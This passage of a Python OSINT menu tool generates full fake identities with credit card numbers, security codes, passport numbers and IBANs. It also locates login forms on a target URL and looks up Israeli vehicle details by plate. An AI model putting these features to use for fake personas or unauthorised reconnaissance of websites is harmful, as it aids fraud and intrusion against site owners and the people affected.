    {White}[{Blue}4{White}] Chile [es_CL]
    {White}[{Blue}5{White}] Colombia [es_CO]
    {White}[{Blue}6{White}] Estonia [es_ES]
    {White}[{Blue}7{White}] Mexico [es_MX] }}
{Blue}• {White}Estonian {{ {White}[{Blue}1{White}] Estonia [et_EE] }}
{Blue}• {White}Persian {{ {White}[{Blue}1{White}] Iran [fa_IR] }}
{Blue}• {White}Finnish {{ {White}[{Blue}1{White}] Finland [fi_FI] }}
{Blue}• {White}Philippines {{ {White}[{Blue}1{White}] Philippines [fil_PH] }}
{Blue}• {White}French {{
    {White}[{Blue}1{White}] Belgium [fr_BE]
    {White}[{Blue}2{White}] Canada [fr_CA]
    {White}[{Blue}3{White}] Switzerland [fr_CH]
    {White}[{Blue}4{White}] France [fr_FR]
    {White}[{Blue}5{White}] Quebec Canada [fr_QC] }}
{Blue}• {White}Irish {{ {White}[{Blue}1{White}] Ireland [ga_IE] }}
{Blue}• {White}Hebrew {{ {White}[{Blue}1{White}] Israel [he_IL] }}
{Blue}• {White}Hindi {{ {White}[{Blue}1{White}]  Car [hi_IN] }}
{Blue}• {White}Hungarian {{ {White}[{Blue}1{White}] Croatia [hu_HU] }}
{Blue}• {White}Armenian {{ {White}[{Blue}1{White}] Armenia [hy_AM] }}
{Blue}• {White}Indonesian {{ {White}[{Blue}1{White}] Indonesia [id_ID] }}
{Blue}• {White}Italian {{
    {White}[{Blue}1{White}] Canada [it_CA]
    {White}[{Blue}2{White}] Italy [it_IT] }}
{Blue}• {White}Japanese {{ {White}[{Blue}1{White}] Japan [ja_JP] }}
{Blue}• {White}Georgian {{ {White}[{Blue}1{White}] Georgia [ka_GE] }}
{Blue}• {White}Korean {{ {White}[{Blue}1{White}] Korea [ko_KR] }}
{Blue}• {White}Latin {{ {White}[{Blue}1{White}] Latin Lang [la] }}
{Blue}• {White}Luxembourgish {{ {White}[{Blue}1{White}] Luxembourg [lb_LU] }}
{Blue}• {White}Lithuanian {{ {White}[{Blue}1{White}] Lithuania [lt_LT] }}
{Blue}• {White}Latvian {{ {White}[{Blue}1{White}] Latvia [lv_LV] }}
{Blue}• {White}Maltese {{ {White}[{Blue}1{White}] Malta [mt_MT] }}
{Blue}• {White}Nepali {{ {White}[{Blue}1{White}] Nepal [ne_NP] }}
{Blue}• {White}Dutch {{
    {White}[{Blue}1{White}] Belgium [nl_BE]
    {White}[{Blue}2{White}] Netherlands, Kingdom of the [nl_NL] }}
{Blue}• {White}Norsk {{ {White}[{Blue}1{White}] Norway [no_NO] }}
{Blue}• {White}Oriya {{ {White}[{Blue}1{White}]  Car [or_IN] }}
{Blue}• {White}Polish {{ {White}[{Blue}1{White}] Poland [pl_PL] }}
{Blue}• {White}Portuguese {{
    {White}[{Blue}1{White}] Brazil [pt_BR]
    {White}[{Blue}2{White}] Portugal [pt_PT] }}
{Blue}• {White}Romanian {{ {White}[{Blue}1{White}] Rome [ro_RO] }}
{Blue}• {White}Russian {{ {White}[{Blue}1{White}] Russia [ru_RU] }}
{Blue}• {White}Slovak {{ {White}[{Blue}1{White}] Slovakia [sk_SK] }}
{Blue}• {White}Slovenian {{ {White}[{Blue}1{White}] Slovenia [sl_SL] }}
{Blue}• {White}Albanian {{ {White}[{Blue}1{White}] Albania [sq_AL] }}
{Blue}• {White}Swedish {{ {White}[{Blue}1{White}] Sweden [sv_SE] }}
{Blue}• {White}Tamil {{ {White}[{Blue}1{White}]  Car [ta_IN] }}
{Blue}• {White}Thai {{
    {White}[{Blue}1{White}] Thai Lang [th]
    {White}[{Blue}2{White}] Thailand [th_TH] }}
{Blue}• {White}Tagalog {{ {White}[{Blue}1{White}] Philippines [tl_PH] }}
{Blue}• {White}Turkish {{ {White}[{Blue}1{White}] Türkiye [tr_TR] }}
{Blue}• {White}Twi {{ {White}[{Blue}1{White}] Ghana [tw_GH] }}
{Blue}• {White}Ukrainian {{ {White}[{Blue}1{White}] Ukraine [uk_UA] }}
{Blue}• {White}Vietnamese {{ {White}[{Blue}1{White}] Vietnam [vi_VN] }}
{Blue}• {White}Yorba {{ {White}[{Blue}1{White}] Nigeria [yo_NG] }}
{Blue}• {White}Chinese {{
    {White}[{Blue}1{White}] China [zh_CN]
    {White}[{Blue}2{White}] Taiwan [zh_TW]
    {White}[{Blue}3{White}] South Africa [zh_ZA] }}""")

        choose = input(f"{White}[{Blue}+{White}] Enter the lang & country code (ex: ar_SA) : {Blue}")

        lang_and_country_list = [
            "ar_AE", "ar_BH", "ar_EG", "ar_JO", "ar_PS", "ar_SA", "az_Az", "bg_BG", "bg_BD", "bg_BA",
            "cs_CZ", "da_DK", "de", "de_AT", "de_CH", "de_DE", "de_DK", "el_GR", "en", "en_AU", 
            "en_BD", "en_CA", "en_GB", "en_IE", "en_IN", "en_NZ", "en_PH", "en_TH", "en_US", "es", 
            "es_AR", "es_CA", "es_CL", "es_CO", "es_ES", "es_MX", "et_EE", "fa_IR", "fi_FI", "fil_PH", 
            "fr_BE", "fr_CA", "fr_CH", "fr_FR", "fr_QC", "ga_IE", "he_IL", "hi_IN", "hu_HU", "hy_AM", 
            "id_ID", "it_CA", "it_IT", "ja_JP", "ka_GE", "ko_KR", "la", "lb_LU", "lt_LT", "lv_LV", 
            "mt_MT", "ne_NP", "nl_BE", "nl_NL", "no_NO", "or_IN", "pl_PL", "pt_BR", "pt_PT", "ro_RO", 
            "ru_RU", "sk_SK", "sl_SL", "sq_AL", "sv_SE", "ta_IN", "th", "th_TH", "tl_PH", "tr_TR",
            "tw_GH", "uk_UA", "vi_VN", "yo_NG", "zh_CN", "zh_TW", "zh_ZA"]

        if choose in lang_and_country_list:
            print(f"{White}Creating...")
            time.sleep(3)
            print(f"[ Create for {Blue}{choose} {Green}✓{White} ]")
            time.sleep(1)

            fake = faker.Faker(choose)

            import datetime

            dt = datetime.datetime.now()

            fake_age = fake.random_int(min=18, max=60)
            birth_year = dt.year - fake_age

            social_status = ["Student", "Graduate", "Employee", "Unemployed", "Single", "Engaged", "Married"]
            social_status_choice = random.choice(social_status)
            phones = [
                "Honor V30", "Honor 30 Pro", "Honor 8A Prime", "Honor Play 9A", "Honor 30S", "Honor Play 4T", "Honor Play Pro",
                "Honor 8A 2020", "Honor 20e", "Honor 30", "Honor Pro+", "Honor 9X Lite", "Honor 9C", "Honor 9S", "Honor 9A",
                "Honor X10", "Honor Play 4", "Honor Play 4 Pro", "Honor 30 Lite", "Honor X10", "Honor 30i", "Honor 10X Lite",
                "Honor V40", "Honor V40 Lite", "Honor Play 5T Youth", "Honor Play 20", "Honor Play 5", "Honor 60", "Honor 50 Pro",
                "Honor 50 SE", "Honor X20 SE", "Honor Play 5T Pro", "Honor Magic3" , "Honor Magic3 Pro", "Honor Magic3 Pro+",
                "Honor X20", "Honor 50 Lite", "Honor X30 MAX", "Honor X30i", "Honor 60", "Honor 60 Pro", "Honor Play 30 Plus",
                "Huawei Mate 30", "Huawei Nova" "Huawei Nova 6", "Huawei Nova 5G", "Huawei Nova SE", "Huawei P40 Lite",
                "Huawei P40", "Huawei Nova" "Huawei Nova 7", "Huawei Nova 7 Pro", "Huawei Nova 7 SE", "Huawei P40 Lite 5G",
                "Huawei Nova 7 SE 5G Youth", "Huawei Mate 40", "Huawei Nova 8 SE", "Huawei Nova 8 5G", "Huawei Nova 8 Pro", 
                "Huawei Mate X2", "Huawei Nova 8 Pro 4G", "Huawei Nova 8i", "Huawei Nova 8 SE Youth", "Huawei P50",
                "Huawei P50 Pro", "Huawei Enjoy 20e", "Huawei Nova 9", "Huawei Nova Y60", "Huawei P50 Pocket", "Huawei Nova 9 SE",
                "Huawei Nova 9 SE 5G", "Huawei Nova Y70", "Huawei Nova Y70 Plus", "Huawei Nova Y90", "Huawei Mate Xs 2",
                "Huawei Nova 10", "Huawei Mate 50", "Huawei Mate 50 Pro", "Huawei Mate 50 RS", "Huawei Mate 10 SE",
                "Huawei Mate Y61", "Samsung Galaxy A51", "Samsung Galaxy A71," "Samsung Galaxy A01", "Samsung Galaxy Xcover Pro",
                "Samsung Galaxy Z Flip", "Samsung Galaxy S20", "Samsung Galaxy S20+", "Samsung Galaxy S20 Ultra",
                "Samsung Galaxy A31", "Samsung Galaxy A11", "Samsung Galaxy A41", "Samsung Galaxy A51", "Samsung Galaxy A51 5G",
                "Samsung Galaxy A71 5G", "Samsung Galaxy A21", "Samsung Galaxy A21s", "Samsung Galaxy A21 5G UW",
                "Samsung Galaxy Z Flip 5G", "Samsung Galaxy Note 20", "Samsung Galaxy Note 20 Ultra", "Samsung Galaxy Z Fold 2",
                "Samsung Galaxy A01 Core", "Samsung Galaxy A51 5G UW", "Samsung Galaxy A42 5G", "Samsung Galaxy S20 FE",
                "Samsung Galaxy F41", "Samsung Galaxy M21s", "Samsung Galaxy A12", "Samsung Galaxy A02s",
                "Samsung Galaxy A32 5G", "Samsung Galaxy S21", "Samsung Galaxy S21+", "Samsung Galaxy S21 Ultra",
                "Samsung Galaxy A02", "Samsung Galaxy M02", "Samsung Galaxy M12", "Samsung Galaxy F62", "Samsung Galaxy M62",
                "Samsung Galaxy A32", "Samsung Galaxy Xcover 5", "Samsung Galaxy A52/A52 5G", "Samsung Galaxy A72",
                "Samsung Galaxy F02s", "Samsung Galaxy F12", "Samsung Galaxy Quantum 2", "Samsung Galaxy F52 5G", 
                "Samsung Galaxy M32", "Samsung Galaxy A22", "Samsung Galaxy A22 5G", "Samsung Galaxy Z Fold 3",
                "Samsung Galaxy Z Flip 3", "Samsung Galaxy M52 5G", "iPhone 6", "iPhone 6s", "iPhone 6 Plus", "iPhone 6s Plus",
                "iPhone 7", "iPhone 7 Plus", "iPhone 8", "iPhone 8 Plus", "iPhone X", "iPhone XR", "iPhone XS", "iPhone XS Max",
                "iPhone SE", "iPhone 12", "iPhone 12 Mini", "iPhone 12 Pro", "iPhone 12 Pro Max", "iPhone 13", "iPhone 13 Mini",
                "iPhone 13 Pro", "iPhone 13 Pro Max", "iPhone 14", "iPhone 14 Plus", "iPhone 14 Pro", "iPhone 14 Pro Max",
                "iPhone 15", "iPhone 15 Plus", "iPhone 15 Pro", "iPhone 15 Pro Max"]
            cars = [
                "Toyota Yaris Sedan 2013", "Toyota Yaris Sedan 2024 Y", "Toyota Yaris Sedan 2024 Y Plus"," Toyota Yaris Sedan 2024 YX",
                "Toyota Yaris Sedan 2014 Fleet", "Toyota Yaris Sedan 2017 manual STD", "Toyota Yaris Sedan 2017 Y FLT", 
                "Toyota Yaris Sedan 2017 Limited", "Toyota Yaris Sedan 2019 Y MT", "Toyota Yaris Sedan 2019 Y",
                "Toyota Yaris Sedan 2019 YX", "Kia Rio 2014", "Hyundai Accent 2022 Smart", "Toyota Corolla 2024 XLI", 
                "Chevrolet Cruze 2014 LT", "Honda Civic 2022 Sport", "MG GT 2024 Comfort", "Honda City 2024 Sport", "Nissan Sunny 2017",
                "Kia Rio 2023 EX", "Honda City 2003", "Hyundai Accent 2023 Smart Plus", "Ford Fiesta 2017", "Peugeot 207 2012 RC hatchback",
                "Bentley Continental GT 2015", "Aston Martin DB9 2017", "Bentley Continental GT 2024", "Mercedes-Benz S-Class Coupe 2022",
                "Ferrari GTC4Lusso 2017", "Maserati GranTurismo 2020", "BMW M5 2024 Competition", "Audi RS 6 2024", "BMW M5 2024",
                "Porsche Taycan Turbo 2021", "GMC Sierra 2024 Elevetion", "GMC Sierra 2022 AT4", "Lexus LX 2011", "Lexus LS 2023",
                "Mazda CX-3 2022 GS", "Mazda CX-3 2022 GTX", "Mazda CX-3 2022 GTL", "Mazda CX-3 2022 GT", "Mazda MX-5 2024",
                "Ford Crown Victoria 2011", "Ford Crown Victoria 2009", "Chevrolet Caprice 2016 Royale", "Ford Taurus 2017 SHO",
                "Chevrolet Impala 2019 LT", "Dodge Charger 2023 R/T Scatpack", "Toyota Avalon 2022 Limited", "Chevrolet Impala 2014 LS",
                "Volkswagen Tiguan 2024 R-Line", "Honda CR-V 2023 DX", "Tesla Model X 2024", "Rolls Royce Ghost 2022", "Jaguar XJ 2020 TC",
                "BMW 7-Series 2022 750Li", "Lexus LS 2023", "Mercedes-Benz S-Class 2024 S500", "Mercedes-Benz S-Class 2024 S450",
                "Audi A8 2024 60 TFSI Quattro LWB", "Geely Preface 2025 GL", "Geely Preface 2025 GF", "MG 7 2024 STD",
                "Hyundai Elantra 2024", "Ford Escort 2020", "Ford Escort 2021", "Dodge Viper 2017 SRT Viper GTS", 
                "Porsche 911 2024 Carrera 4 GTS", "Suzuki Carry 2013", "Nissan Patrol 2024 XE", "GMC Yukon 2007", 
                "Ford Expedition 2022 Limited", "Chevrolet Tahoe 2016 LTZ", "Hyundai Azera 2013", "Hyundai Azera 2024 Base", 
                "Chrysler 300C 2024", "Toyota Crown 2023", "Ford Taurus 2012", "Hyundai Elantra 2024", "BMW M4 2024 Competition",
                "Toyota Camry 2003", "Chevrolet Malebu 2020 LS", "Chevrolet Malebu 2021 LS", "ALFA ROMEO 4C 2013", "Kia Cerato 2012",
                "BMW 4-Series 2024 430i", "BMW 4-Series 2024 440i", "Hyundai Accent 2011", "Hyundai Accent 2021 Comfort"]
            foods = [
                "Pasta", "Hamburger", "Shawarma", "Rice", "Potatoes", "Plants", "Sausage", "Noodles", "Kebab", "Popular Food", "Donuts",
                "Eggs", "Spinach", "Pizza", "Pancakes", "None"]

            print(f"""
{White}[{Blue}-{White}] Name : {fake.name()}
{White}[{Blue}-{White}] Age : {fake_age}
{White}[{Blue}-{White}] Date Of Birth : {birth_year}/{fake.month()}/{fake.day_of_month()} {fake.time()}{dt.strftime("%p")}
{White}[{Blue}-{White}] Address : {fake.address()}
{White}[{Blue}-{White}] Phone No. : {fake.phone_number()}
{White}[{Blue}-{White}] Email : {fake.email()}
{White}[{Blue}-{White}] Phone : {random.choice(phones)}
{White}[{Blue}-{White}] Social Status : {random.choice(social_status_choice)}
{White}[{Blue}-{White}] Job : {fake.job() if social_status_choice == "Employee" else None} 
{White}[{Blue}-{White}] Company : {fake.company() if social_status_choice == "Employee" else None} 
{White}[{Blue}-{White}] Public IPv4 : {fake.ipv4_public()}
{White}[{Blue}-{White}] Private IPv4 : {fake.ipv4_private()}
{White}[{Blue}-{White}] IPv6 : {fake.ipv6()}
{White}[{Blue}-{White}] Mac Address : {fake.mac_address()}
{White}[{Blue}-{White}] NIC Card Address : {fake.nic_handle()}
{White}[{Blue}-{White}] BBAN : {fake.bban()}
{White}[{Blue}-{White}] IBAN : {fake.iban()}
{White}[{Blue}-{White}] Credit Card Provider : {fake.credit_card_provider()}
{White}[{Blue}-{White}] Credit Card No. : {fake.credit_card_number()}
{White}[{Blue}-{White}] Credit Card Sec Code : {fake.credit_card_security_code()}
{White}[{Blue}-{White}] Credit Card Expire : {fake.credit_card_expire()}
{White}[{Blue}-{White}] Swift Code : {fake.swift(length=11, primary=True, use_dataset=True)}
{White}[{Blue}-{White}] Financial balance : {fake.pricetag()}
{White}[{Blue}-{White}] Passport No. : {fake.passport_number()}
{White}[{Blue}-{White}] Passport DOB : {birth_year}
{White}[{Blue}-{White}] Car : {random.choice(cars)} {fake.color_name()}
{White}[{Blue}-{White}] Car License Plate : {fake.license_plate()}
{White}[{Blue}-{White}] Car Body No. : {fake.vin()}
{White}[{Blue}-{White}] Fav Color : {fake.color_name()}
{White}[{Blue}-{White}] Fav Food : {random.choice(foods)}""")
        else: print(f"{Red}Please choose a correct option!")
    elif selection == "23" or selection == "Create Hashtags" or selection == "CREATE HASHTAGS" or selection == "create Hashtags":
        keyword = input(f"{White}[{Blue}+{White}] Enter the keyword (ex: hacking) : {Blue}")

        url = f"http://hashmeapi-stage.us-west-2.elasticbeanstalk.com/search?q={keyword}"
        r = requests.get(url)
        hashtags = r.json()
        if len(hashtags) > 1:
            for i in range(len(hashtags)):
                print(f"#{hashtags[i]}")
        else: print(f"{White}Try another keyword")
    elif selection == "24" or selection == "Extract Login Panels" or selection == "EXTRACT LOGIN PANELS" or selection == "extract login panels":
        def find_login_panel(url):
            try:
                user_agent = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
                response = requests.get(url, headers=user_agent, verify=False, timeout=8, allow_redirects=True)
                soup = BeautifulSoup(response.content, "html.parser")
                forms = soup.find_all("form")
                if forms:
                    login_form = forms[0]
                    action = login_form.get("action")
                    if action and not action.startswith("http"):
                        action = url + action
                    print(f"\n{White}[{Green}✓{White}] Login Panel Found : {Yellow}{action}")
                else:
                    print(f"\n{White}[{Red}X{White}] Not any login panel found")
            except BaseException as msg: print(f"{Red}E: {msg}")

        url = input(f"{White}[{Blue}+{White}] Enter the URL target : {Blue}")

        print(f"{White}Extracting...")
        time.sleep(3)
        print(f"[ Extract for {Blue}{url} {Green}✓{White} ]")
        time.sleep(1)
        find_login_panel(url)   
    elif selection == "25" or selection == "Cars OSINT" or selection == "CARS OSINT" or selection == "cars osint":
        car_country = input(f"""{White}[{Blue}01{White}] Israel [IL]
{White}[{Blue}+{White}] Enter the country name or countrycode : {Blue}""")

        if car_country == "Israel" or car_country == "IL":
            try:
                plate_number = input(f"{White}[{Blue}+{White}] Enter the plate number (ex: 123-45-6 78) : {Blue}")
                print(f"{White}Getting info...")
                time.sleep(3)
                print(f"[ Get Info for {Blue}{plate_number} {Green}✓{White} ]")
                time.sleep(1)

                veh_request_json = {"DynamicTemplateID":"af3b0f3e-7b99-4a3f-a9cf-15e02384fe1c","QueryFilters":{"skip":{"Query":"0"},"mispar_rechev":{"Query":plate_number}},"From":"0"}

                data = requests.post("https://www.gov.il/he/api/DataGovProxy/GetDGResults", json=veh_request_json)

                value = json.loads(data.text)
                car_name = value['Results'][0]['Data']['tozeret_nm']
                trade_name = value['Results'][0]['Data']['kinuy_mishari']
                model = value['Results'][0]['Data']['shnat_yitzur']
                owner = value['Results'][0]['Data']['baalut']
                car_color = value['Results'][0]['Data']['tzeva_rechev']

                table = Table(title="")
                table.add_column("Info", no_wrap=True)
                table.add_column("Car")
                table.add_row("Car Name", car_name)
                table.add_row("Trade Name", trade_name)
                table.add_row("Model", model)
                table.add_row("Car Color", car_color)
                table.add_row("Current Owner", owner)
                Console().print(table, justify="left")
            except BaseException as msg: print(f"{Red}E: {msg}")
        else: print(f"{Red}Please choose a correct country name or countrycode!")
    elif selection == "97" or selection == "Update" or selection == "UPDATE":
        print(f"{White}Updating...\n")
        
        time.sleep(0.1)

        spinner = ["|", "/", "-", "\\"]
        spinner_index = 0

        steps = 50

        for i in range(steps):
            percent = 100*(i+1)/steps
            bar_length = 50
            filled_length = int(bar_length*percent/100)
            
            bar = "█"*filled_length+"-"*(bar_length-filled_length)
            sys.stdout.write(f"\r{Green}{spinner[spinner_index % len(spinner)]}{White} [{bar}] {percent:.2f}%")
            sys.stdout.flush()
            spinner_index += 1
            time.sleep(0.1)

        subprocess.run(["git", "clone", "https://github.com/tlersa/TS-OSINT.git"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"""\n{White}[{Green}✓{White}] Updated successfully
new version saved in {Blue}{ os.getcwd()}\TS-OSINT{White}""")
    elif selection == "98" or selection == "Report A Bug" or selection == "REPORT A BUG" or selection == "rebort a bug":
        print(f"""{White}Contact me through one of my acc
all my acc : {Blue}https://tlersa.github.io/tleralshahrani/Index.html#contact""")
    elif selection == "99" or selection == "Help" or selection == "HELP" or selection == "help":
        print(f"""{White}Contact me through one of my acc
all my acc : {Blue}https://tlersa.github.io/tleralshahrani/Index.html#contact""")
    elif selection == "00" or selection == "Exit" or selection == "EXIT" or selection == "exit": exit(f"{White}")
    else: print(f"{Red}Please choose a correct option!")
    another_operation()

def main():
    main_menu()

    while True:
        user_input = input(f"{White}Choose : {Blue}")
        handle_selection(user_input)

if __name__ == "__main__": main()
